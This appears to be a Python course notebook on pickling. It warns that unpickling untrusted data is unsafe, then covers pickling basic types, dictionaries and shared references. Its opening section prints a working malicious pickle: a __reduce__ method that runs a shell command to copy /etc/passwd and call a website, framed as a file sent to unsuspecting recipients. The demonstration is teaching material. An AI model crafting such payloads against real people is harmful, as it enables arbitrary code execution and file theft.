---
jupyter:
  jupytext:
    text_representation:
      extension: .md
      format_name: markdown
      format_version: '1.1'
      jupytext_version: 1.2.4
  kernelspec:
    display_name: Python 3
    language: python
    name: python3
---

### Pickling


#### Not Secure!


Pickling is not a secure way to deserialize data objects. **DO NOT** unpickle anything you did not pickle yourself. You have been **WARNED**!


Here's how easy it is to create an exploit.

I am going to pickle an object that is going to use the unix shell (admittedly this will not work on Windows, but it could with some more complicated code - plus I don't need this to run on every machine in the world, just as many as possible - at least that's the mindset if I were a hacker I guess)

```python
import os
import pickle


class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)
```

Now, I serialize this code to a file:

```python
serialize_exploit('loadme')
```

Now I send this file to some unsuspecting recipients and tell them they just need to load this up in their Python app. They deserialize the pickled object like so:

```python
import pickle

pickle.load(open('loadme', 'rb'))
```

And now take a look at your folder that contains this notebook!


#### Pickling Dictionaries


In this part of the course I am only going to discuss pickling basic data types such as numbers, strings, tuples, lists, sets and dictionaries.

In general tuples, lists, sets and dictionaries are all picklable as long as their elements are themselves picklable.


Let's start by serializing some simple data types, such as strings and numbers.

Instead of serializing to a file, I will store the resulting pickle data in a variable, so we can easily inspect it and unpickle it:

```python
import pickle
```

```python
ser = pickle.dumps('Python Pickled Peppers')
```

```python
ser
```

We can deserialize the data this way:

```python
deser = pickle.loads(ser)
```

```python
deser
```

We can do the same thing with numerics:

```python
ser = pickle.dumps(3.14)
```

```python
ser
```

```python
deser = pickle.loads(ser)
```

```python
deser
```

We can do the same with lists and tuples:

```python
d = [10, 20, ('a', 'b', 30)]
```

```python
ser = pickle.dumps(d)
```

```python
ser
```

```python
deser = pickle.loads(ser)
```

```python
deser
```

Note that the original and the deserialized objects are equal, but not identical:

```python
d is deser, d == deser
```

This works the same way with sets too:

```python
s = {'a', 'b', 'x', 10}
```

```python
s
```

```python
ser = pickle.dumps(s)
print(ser)
```

```python
deser = pickle.loads(ser)
print(deser)
```

And finally, we can pickle dictionaries as well:

```python
d = {'b': 1, 'a': 2, 'c': {'x': 10, 'y': 20}}
```

```python
print(d)
```

```python
ser = pickle.dumps(d)
```

```python
ser
```

```python
deser = pickle.loads(ser)
```

```python
print(deser)
```

```python
d == deser
```

What happens if we pickle a dictionary that has two of it's values set to another dictionary?

```python
d1 = {'a': 10, 'b': 20}
d2 = {'x': 100, 'y': d1, 'z': d1}
```

```python
print(d2)
```

Let's say we pickle `d2`:

```python
ser = pickle.dumps(d2)
```

Now let's unpickle that object:

```python
d3 = pickle.loads(ser)
```

```python
d3
```

That seems to work... Is that sub-dictionary still the same as the original one?

```python
d3['y'] == d2['y']
```

```python
d3['y'] is d2['y']
```

But consider the original dictionary `d2`: both the `x` and `y` keys referenced the **same** dictionary `d1`:

```python
d2['y'] is d2['z']
```

How did this work with our deserialized dictionary?

```python
d3['y'] == d3['z']
```

As you can see the relative shared object is maintained.


As you can see our dictionary `d` looks like the earlier one. So, when Python serializes the dictionary, it behaves very similarly to serializing a deep copy of the dictionary. The same thing happens with other collections types such as lists, sets, and tuples.


What this means though is that you have to be very careful how you use serialization and deserialization.

Consider this piece of code:

```python
d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)
```

Now suppose we pickle our dictionaries to restore those values the next time around, but use the same code, expecting the same result:

```python
d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

# simulate exiting the program, or maybe just restarting the notebook
del d1
del d2

# load the data back up
d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)

# and continue processing as before
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)
```

So just remember that as soon as you pickle a dictionary, whatever object references it had to another object is essentially lost - just as if you had done a deep copy first. It's a subtle point, but one that can easily lead to bugs if we're not careful.


However, the pickle module is relatively intelligent and will not re-pickle an object it has already pickled - which means that **relative** references are preserved.

Let's see an example of what I mean by this:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __eq__(self, other):
        return self.name == other.name and self.age == other.age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```

```python
john = Person('John Cleese', 79)
eric = Person('Eric Idle', 75)
michael = Person('Michael Palin', 75)
```

```python
parrot_sketch = {
    "title": "Parrot Sketch",
    "actors": [john, michael]
}

ministry_sketch = {
    "title": "Ministry of Silly Walks",
    "actors": [john, michael]
}

joke_sketch = {
    "title": "Funniest Joke in the World",
    "actors": [eric, michael]
}
```

```python
fan_favorites = {
    "user_1": [parrot_sketch, joke_sketch],
    "user_2": [parrot_sketch, ministry_sketch]
}
```

```python
from pprint import pprint
pprint(fan_favorites)
```

As you can see we have some shared references, for example:

```python
fan_favorites['user_1'][0] is fan_favorites['user_2'][0]
```

Let's store the id of the `parrot_sketch` for later reference:

```python
parrot_id_original = id(parrot_sketch)
```

Now let's pickle and unpickle this object:

```python
ser = pickle.dumps(fan_favorites)
```

```python
new_fan_favorites = pickle.loads(ser)
```

```python
fan_favorites == new_fan_favorites
```

And let's look at the `id` of the parrot_sketch object in our new dictionary compared to the original one:

```python
id(fan_favorites['user_1'][0]), id(new_fan_favorites['user_1'][0])
```

As expected the id's differ - but the objects are equal:

```python
fan_favorites['user_1'][0] == new_fan_favorites['user_1'][0]
```

But now let's look at the parrot sketch that is in both `user_1` and `user_2` - remember that originally the objects were identical (`is`):

```python
fan_favorites['user_1'][0] is fan_favorites['user_2'][0]
```

and with our new object:

```python
new_fan_favorites['user_1'][0] is new_fan_favorites['user_2'][0]
```

As you can see the **relative** relationship between objects that were pickled is **preserved**.


And that's all I'm really going to say about pickling objects in Python. Instead I'm going to focus more on what is probably a more relevant topic to many of you - JSON serialization/deserialization.
